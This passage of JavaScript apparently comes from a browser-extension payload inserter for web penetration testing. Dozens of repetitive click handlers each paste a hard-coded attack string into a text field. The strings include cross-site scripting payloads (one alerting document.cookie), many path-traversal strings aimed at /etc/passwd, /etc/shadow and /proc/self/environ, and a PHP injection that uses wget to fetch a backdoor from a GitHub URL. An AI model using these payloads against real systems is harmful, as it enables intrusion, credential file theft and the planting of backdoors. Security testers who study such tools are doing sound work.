				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '</br style=a:expression(alert())>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipffffr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '</script><script>alert(1)</script>';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipffffv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "'><BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert('XSS')>";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfffsx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'Execute(MsgBox(chr(88)&chr(83)&chr(83)))<';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfffsv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "<body onLoad='while(true) alert('XSS');'>";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfffgt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "''></title><script>alert(1111)</script>";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfffnn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "</textarea>''><script>alert(document.cookie)</script>";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#xlfipfsx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipon').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "<?system(‘wget https://raw.githubusercontent.com/Xero-Zero/simple-php-backdoor/master/fuvk.txt -O null.php’);?>";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfiptw').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/etc/passwd';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipthr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '///etc/passwd';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipfr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '../../../../../../../../../../../../etc/passwd';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipfv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipsx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '../../../../../../../../../../../../etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipsvn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '../../../../../../../proc/self/environ';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipght').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '....................etcpasswd';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipnn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'etcpasswd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfiptn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '....................etcpasswd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipel').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '//etc/passwd';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfiptlv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '....//....//....//....//....//....//....//....//....//....//etc/passwd';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfiptrn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '//etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfiptsx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '....//....//....//....//....//....//....//....//....//....//etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipfrt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '///etc/hosts';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipft').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/etc/hosts%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipsxt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '../../../../../../../../../../../../etc/hosts%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipsvt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '///etc/shadow';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipgtn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '../../../../../../../../../../../../etc/shadow';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipntn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/etc/shadow%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfiptwn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '../../../../../../../../../../../../etc/shadow%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipton').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '..%20..%20..%20../etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfipttw').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '....//....//....//....//....//....//....//....//....//....//etc/hosts';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfiptft').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '....//....//....//....//....//....//....//....//....//....//etc/hosts%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfiptfr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += 'etcgroup%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});



	$('#lfiptfv').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '....................etcgroup%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptsx').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptsvn').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/group%00';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#lfiptgt').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
